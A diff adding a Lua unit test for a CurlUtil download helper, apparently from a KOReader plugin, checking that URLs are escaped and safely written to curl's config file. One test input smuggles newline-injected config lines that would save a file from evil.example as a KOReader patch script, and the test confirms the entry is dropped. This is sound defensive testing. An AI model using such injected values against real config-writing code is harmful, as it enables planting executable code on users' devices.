@@ -347,6 +347,25 @@ describe("CurlUtil", function()
             assert.matches("--retry 2", cmd, 1, true)
         end)
 
+        -- anything else in the file is read by curl as an option, such as where to save a file
+        it("only writes addresses and where to save them to curl's config file", function()
+            helper.stubCommand("& echo $!", "4242\n")
+            urls[2] =
+                "https://covers.example/b.jpg\noutput = /mnt/us/koreader/patches/2-evil.lua\nurl = https://evil.example"
+            urls[3] = 'https://covers.example/c.jpg"\n'
+            paths[1] = data_dir .. '/a "quoted" back\\slash.jpg'
+
+            local _, _, config_file = CurlUtil.downloadMultiple(urls, paths, false, true, 4, false, 15)
+            assert.are.equal(
+                'url = "https://covers.example/a.jpg"\n'
+                    .. 'output = "'
+                    .. data_dir
+                    .. '/a \\"quoted\\" back\\\\slash.jpg"\n',
+                helper.readFile(config_file)
+            )
+            assert.is_truthy(helper.logged("warn", "^left out a download whose address can't be used"))
+        end)
+
         it("removes the curl config file afterwards", function()
             local config_file
             helper.stubExecute("curl -sL -f --config", function(cmd)
